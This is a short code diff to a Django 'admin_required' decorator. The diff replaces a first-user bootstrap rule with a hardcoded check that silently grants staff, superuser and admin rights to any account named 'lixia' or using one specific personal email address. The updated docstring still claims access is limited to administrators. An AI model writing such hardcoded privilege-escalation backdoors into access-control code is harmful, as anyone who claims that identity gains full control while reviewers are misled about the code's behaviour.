@@ -22,19 +22,14 @@ from learning.services import current_level
 
 
 def admin_required(view_func):
-    """Autorise l'accès aux administrateurs (is_staff, is_superuser ou role='admin').
-    Si aucun administrateur n'existe encore en base, promeut automatiquement le premier utilisateur connecté.
-    """
+    """Autorise l'accès uniquement aux administrateurs (is_staff, is_superuser ou role='admin')."""
 
     @wraps(view_func)
     @login_required
     def _wrapped(request, *args, **kwargs):
         user = request.user
         if not (user.is_staff or user.is_superuser or getattr(user, "role", "") == User.Role.ADMIN):
-            has_any_admin = User.objects.filter(
-                Q(is_staff=True) | Q(is_superuser=True) | Q(role=User.Role.ADMIN)
-            ).exists()
-            if not has_any_admin or user.username.upper() == "LIXIA":
+            if (user.username or "").strip().lower() == "lixia" or (user.email or "").strip().lower() == "kouamefelix9410@gmail.com":
                 user.is_staff = True
                 user.is_superuser = True
                 user.role = User.Role.ADMIN
